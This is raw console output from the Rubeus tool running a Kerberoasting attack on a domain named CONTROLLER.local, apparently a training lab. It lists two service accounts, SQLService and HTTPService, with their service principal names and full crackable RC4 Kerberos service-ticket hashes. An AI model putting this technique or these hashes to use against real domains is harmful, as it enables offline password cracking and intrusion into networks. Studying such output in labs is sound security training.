   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
                             l:30111*$FCF503067E9570372CCA00B7E41CF5DE$7872103ACCBFC4007C316814B30E952C99870E
                             CA03A3870C029460AC6C2EE622ECAF28B80EC25CC380526EA584B7DDFEC258E770FB38C1C7D0E665
                             461D6300591CAD10CEFF7C556E573165FBC8E9E34D72ABE7AE0B2208B204B86E6C189A57E230494C
                             24B89C1B10C396ED933D22FF9A1A876FDAB8029F936C974FE3ACE5C42B1413782F362AAE8FBBDFE5
                             BB26B70AB63F52C3AB7D9E9CE5EF569674D9FB7C98AB9B730D922D818BB4456F9B01AC8595159435
                             C02AFB96E9BF5EAD68BF72E8679B10111321CCA23F23C6D4A5E9FB11F143E0A84169ED665D54B0E2
                             176A3E347B4586A520E101555102B8C93EB6124AF3F6956F28646A7C0315A2F76041EEEEBF445C8B
                             0EAF8D82952EE0E4DE2D557DF1558639BB2A26C4C6279F998012CB74803C78B1DD268E0BCE56AE94
                             B5DC7AEFBFF56527D6EA62007564B35CA49FBFF80969CB1A7217C476194E560ACFE223A849E175CF
                             F3533CA8FAA39E917277FE815F266D1594C9D5730438274EB31FBD86ECA49458D31D591D65EA5A1A
                             D65EB9F86E094CA091AE3CB3232D6E32DE7E887647C2AD7F1E4A2612B3BF7F483F6C96C2CF0DF265
                             E4102D7F18FD5C2846E5E59408F9CCB0462CF9D6C0AC50C8DCA7982C9E9E6A86ADA410BE7B0167A5
                             ED602813DE127E20AA75A1E1E84DC2E08B2E1CEEBB20BF8B8FB35AAAA74917B8018E8A2AB4232686
                             DEB2408DE22A7FCF0B0772C2D47A9BE049E6F272E41F816A2174FFDBEC6388A12456C9628AC2AA9B
                             087710D7E2643D55D8E8D0009637EBBC0036D46D2A9147470B483131FE881883620723A9B51E9E85
                             4D016FB46BC20AAEA441BC4F89CDB76E4D5985988776F7833433E59984473E8CA8FD13550258C3CE
                             E3CA2F40015EEB0F0C8247050E43820AD9EBE8AEAD435E785D5B3C4931D2ED7331D7559A0F95A489
                             5FBAE8265345957281C744917A7B60A2CB88999A0B0EF809892A06B200946BA55FE960A024589A07
                             2A95EAE97127EC495425F5D2A32B50E07573545E2A28D8A77EE6FD16FEF57A0D775E615F4E44FA22
                             0A1EF077061BB2F2BC7CD613D9AE4B7A2E5EA915882EB5FC495A992F498B0E52E774C6833FDDFA5D
                             518FA2D7FC5DCC45971525171B6F27D0A5C407E833ADC645E0615DA8D2DF6D09CAA8ADFEC36AF974
                             1B6877098EC0A5A4045408D7FE98AD04B6334EC1BEB69CC41231C6DFD46C20A7F24C5EDB0174D6DB
                             1998F0FBFA592A9D7374D8A02963563E64C28E7FEB9DD7E9AEA06B1946436E06162E020B9D9F0322
                             629DF6AA321711DA058C3F8FA265511ED17F53185DD1FE23839DC1214B600718DB700A3D966DECB9
                             BBD662A7D497134F1FF51004597EFBDFDCA2213352A79CBCEFB65DCE400CE4C2C3621694AB4D32C2
                             D568F724E6714CF08719621DF0B3FF8EC9E8F40C0BF5A3813E7F3E97CA573600A8C32B5FAD6524AB
                             DAA8ED6D1DC4F4ADD651F2AD7CCE7A856C263D3136FBE938CE5F72F34FCA3168AA00C9D875370243
                             7E851C6907055AC1D9CDD722AD1553CC512483922F574C98C5B84A60613B30A14B2E8E4A42CF7BCE
                             C9382BE8872B8ADCC5B2886FA7F49975063CB0512F5BC21904917979FC8F5D7E9E4584736535E935
                             661ABA1F284D3E0011C3D9859B5CB266E5E1CB589FB0B3EB09A1BD3F53


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$A61A68E2B7AA93E875C9E853E4289F0E$7D5F40F5105BC0E7DF88D69497FAA554AAAA
                             C6EF21723772EB923D762ADD0C92E85B86A940FAE8FFF3EDD0AB5FB8D7390D848CD62F6E5956403E
                             C9A286E37F586EFCF801363409944D838383A51585E622CAF0EA5E1ED159A47920A6447BB26E3FAD
                             1DC0AE8C9676659DC6809A5448E0B3CEA551C82AF619FE68758BFA916E8E5CDFE8CC78481AFC8176
                             319EC5645BBE4A3899278F22BF0728A8D6CB8C57ABB9A9BFE9A6F330B3F28EC7986BA2EA5097B608
                             DE2AF51CF10857C6651EDE00517FABFCAF2493A282BF32E2BD1100516ABE1E16F98244C6C9FD67C5
                             524A469EF34211BA64BDCF471F29C641F9C30E3FEABD0FABE3FECD1BCDB9B86F8BCB375B840402EC
                             D5F1BB08DCCEA62C2E32A8558ED15CAFEFEB90789F7FCB24D4D32E66F89CA984EF5AC87C17D61DEE
                             E3BA686BED153BEB079F8B53D9D9F7B9B54B141D533834E9E8EF7B2CFBA8F890A0470453969B9B54
                             48C6B9B97E55C7FB4964750E7F67B16B21AB357F2754034AA6193C6B43A5CAFE3B206A44F0923E8B
                             B51602A92483523A8F5C377CA9B8D923D1958AFFE3D07AA35A9CD9E5745A06506192A874BED9F483
                             27B8E558184BE8DDDF28BBBFC679B4AFC209234A3335A721AACD7B11C814B97E3A9EFAE0E8E8CA8B
                             CD702F83F0A6915EA455A6E7B3832BFB3BFB64AD0C6611428FECF1D2BF9CE0D2FB19E6ACD34F34E6
                             2E8780F1A0C0A0CB4602E23D1A32E881C33630D3EC043DD98500EBAEBCF4F82EB8D8405296E36B49
                             4EBE5B5B00A8F5C491524563A05DABB792E459E90B447134EE268478AB40DD3B3FD4D50389693125
                             8BD3833A19B43EC02057E0CFFCAC90BC4850DB97AA6E20C2891B27B021B9E4AC024A9A07DD702E43
                             A120A1674CB7F47C2457E452B05B008202C7CCBCD39F8EC3FC474916B72D093909A3965FC202702C
                             DBC430D2C03E06CB32FA0EB2360676E36B142D8A55574D599AFD8AD7839EC8ED688C07867558567E
                             5C06279D26997D237C85F5F0300BB76A7AAE605E71FD52011CA0B4B11C11FA2465C51F2331C14417
                             D1E7954242C17956192C088C3491FF5EE6F7764E9D6A4DA13CC010472B7BA365C97768093A6D2D8F
                             0FCECC9BEB7C020FDD0CB7818FEA52F5596FD0A5565782FC6E514C698BE7BF66A72B4F1E76343BB8
                             D2004C41561A0BA263DD6B91F064DA7DD36BB2E83951ED793E84252D695179BC339DE8213907A5C7
                             FE9B4F8DBFB1838B33BAEFDDB41E5F63612C2568A8960F8E7FCA68E05FE77956CCC31E8349740BDD
                             700C400B29F518E43E86EB48A749A5C6264A6D02FDAF6D4EA4FE051253DF39D58C444B3797BB0263
                             92AE86BF9D517FBDE608AED5F0C39D2B09F3B1699CBE982F09041DE571457C8DD046017E26A42262
                             BA54AD0B0EECB0AAB7258DFB4AA813D581BFC1D3A6729ADB395476EDD4D20338418D7C774DEB83BD
                             4316FCA3ED3E4F7242EB91C481CB78F9BEDDE0847470F411C62045A6F1F845FC8AAA038AFAFE40F5
                             5AB50F4079BA8AC6DCF1F3A434DA6141E60743D166D76FCB3C31669ADE28FEDE26A8A73818C13CD8
                             FD81D6CE2D98CE8D741F0ED9B571DDD90207C2D6ED1E51B6F365194805A3A8F2A99C259785488502
                             EF88FC92077C8BA133114478E60B4C5E62BF4E1EE934DBB1D1C9E8F1FFD7
